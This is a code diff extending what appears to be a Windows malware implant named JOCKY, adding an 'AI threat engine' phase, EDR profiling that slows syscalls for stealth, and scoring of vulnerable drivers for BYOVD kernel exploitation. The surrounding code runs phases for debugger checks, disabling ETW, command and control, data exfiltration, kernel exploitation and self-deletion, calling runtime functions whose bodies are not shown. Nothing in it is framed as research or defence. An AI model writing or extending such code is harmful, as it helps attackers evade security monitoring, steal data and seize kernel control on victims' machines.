@@ -9,13 +9,63 @@ const BUILD_ID = "JOCKY_WINDOWS_SIMPLE_V1"
 var collected_data = ""
 var edr_disabled = false
 var kernel_access = false
+var threat_level = 0
+var edr_mode = 0
 
-// ===== PHASE 1: EDR EVASION =====
+// ===== PHASE 0: AI THREAT ENGINE INITIALIZATION =====
+fn phase_ai_init() -> bool {
+    println("[*] Phase 0: AI Threat Engine Initialization")
+
+    // Initialize AI threat assessment engine
+    if jocky_ai_init() {
+        println("    [+] AI threat engine initialized")
+
+        // Get current threat level
+        threat_level = jocky_ai_get_threat_level()
+        println("    [+] Threat level: " + string(threat_level))
+
+        // Determine adaptive strategy
+        if threat_level == 3 {
+            println("    [!] CRITICAL threat detected - maximum evasion enabled")
+        } else if threat_level == 2 {
+            println("    [!] HIGH threat detected - aggressive evasion")
+        } else if threat_level == 1 {
+            println("    [*] MEDIUM threat detected - standard evasion")
+        } else {
+            println("    [*] LOW threat detected - minimal evasion")
+        }
+    } else {
+        println("    [-] AI initialization failed, using fallback")
+    }
+
+    return true
+}
+
+// ===== PHASE 1: EDR EVASION WITH ADAPTIVE PROFILING =====
 fn phase_evasion() -> bool {
-    println("[*] Phase 1: EDR Evasion")
+    println("[*] Phase 1: EDR Evasion with Profiling")
 
     if jocky_is_debugger_present() {
         return false
+    }
+
+    // Initialize EDR profiler to detect active monitoring
+    let profiler = jocky_edr_profiler_init()
+    if profiler != null {
+        println("    [+] EDR profiler initialized")
+
+        // Analyze EDR behavior
+        edr_mode = jocky_edr_profiler_analyze(profiler)
+        println("    [+] EDR profile analyzed: " + string(edr_mode))
+
+        // Get appropriate syscall delay for current EDR state
+        let delay = jocky_edr_get_syscall_delay(edr_mode)
+        println("    [+] Syscall delay: " + string(delay) + "ms")
+
+        // Check if should reduce syscalls based on EDR profile
+        if jocky_edr_should_reduce_syscalls(edr_mode) {
+            println("    [+] Reducing syscall frequency for stealth")
+        }
     }
 
     let etw_result = jocky_disable_etw("")
@@ -110,9 +160,32 @@ fn phase_exfil() -> bool {
     return true
 }
 
-// ===== PHASE 7: KERNEL EXPLOITATION =====
+// ===== PHASE 7: KERNEL EXPLOITATION WITH DRIVER INTELLIGENCE =====
 fn phase_kernel() -> bool {
-    println("[*] Phase 7: Kernel Exploitation")
+    println("[*] Phase 7: Kernel Exploitation with Driver Intelligence")
+
+    // Use driver intelligence to select best driver
+    // Score required capabilities: physical memory R/W + MSR access
+    let best_driver = jocky_driver_select_best(96)  // 0x60 = PHYS_READ | PHYS_WRITE | MSR_READ
+
+    if best_driver != "" {
+        println("    [+] Selected driver: " + best_driver)
+
+        // Get score for selected driver
+        let score = jocky_driver_score_composite(best_driver)
+        println("    [+] Driver quality score: " + string(score))
+
+        if score > 70 {
+            println("    [+] High-quality driver - proceeding")
+        } else if score > 50 {
+            println("    [!] Medium-quality driver - may trigger detection")
+        } else {
+            println("    [-] Low-quality driver - last resort only")
+        }
+    } else {
+        println("    [-] No suitable driver found, trying fallback chain")
+        // Fallback will attempt multiple drivers in order
+    }
 
     let ctx = jocky_byovd_new()
     println("    [+] BYOVD context created")
@@ -194,12 +267,16 @@ fn phase_delete() -> bool {
 fn main() -> i32 {
     println("")
     println("╔════════════════════════════════════════════════════════════╗")
-    println("║ JOCKY Windows Production - 40+ Runtime APIs                ║")
+    println("║ JOCKY Windows - AI Threat Engine + Driver Intelligence    ║")
     println("╚════════════════════════════════════════════════════════════╝")
     println("")
     println("[*] Build: " + BUILD_ID)
     println("")
 
+    // Phase 0: Initialize AI threat engine first
+    let _ = phase_ai_init()
+
+    // Execute all phases
     let _ = phase_evasion()
     let _ = phase_c2()
     let _ = phase_model()
@@ -216,6 +293,8 @@ fn main() -> i32 {
     println("[+] Execution complete")
     println("[*] Data exfiltrated: " + string(strlen(collected_data)) + " bytes")
     println("[*] Kernel access: " + string(kernel_access))
+    println("[*] Threat level: " + string(threat_level))
+    println("[*] EDR mode: " + string(edr_mode))
 
     return 0
 }
